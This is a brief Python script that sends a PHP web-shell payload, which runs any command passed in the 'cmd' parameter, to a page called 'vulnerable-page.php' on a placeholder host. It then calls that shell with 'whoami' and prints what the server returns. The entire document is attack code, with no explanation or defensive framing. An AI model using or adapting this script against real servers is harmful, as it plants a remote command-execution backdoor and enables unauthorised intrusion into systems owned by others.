import requests

url = "http://example.com/vulnerable-page.php"
payload = "<?php system($_GET['cmd']); ?>"

requests.post(url, data={"payload": payload})

r = requests.get(url + "?cmd=whoami")
print(r.text)
